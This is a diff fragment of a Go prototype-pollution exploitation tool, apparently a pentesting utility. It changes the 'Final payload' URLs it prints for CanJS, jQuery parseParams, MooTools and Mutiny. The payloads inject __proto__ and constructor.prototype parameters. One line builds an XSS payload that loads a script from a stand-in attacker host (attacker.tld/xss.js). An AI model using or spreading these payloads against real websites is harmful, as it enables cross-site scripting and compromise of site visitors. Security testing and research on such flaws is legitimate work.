@@ -263,18 +263,18 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[customScriptSrc]=//attacker.tld/xss.js")  
             } else if strings.Contains(string(res1), "CanJS deparam") {
                log.Printf(Info + " Displaying all possible payloads")
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__[test]=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[test]=test")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")
             } else if strings.Contains(string(res1), "jQuery parseParams") {
                log.Printf(Info + " Displaying all possible payloads")
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__.test=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__.test=test")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor.prototype.test=test")    
             } else if strings.Contains(string(res1), "MooTools More")   {    
                log.Printf(Info + " Displaying all possible payloads")
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__[test]=test")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[test]=test")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")              
             } else if strings.Contains(string(res1), "Mutiny") {
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?__proto__.test=test")   
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__.test=test")   
             } else {
                log.Printf(Error + " An unexcepted error occured")
             }
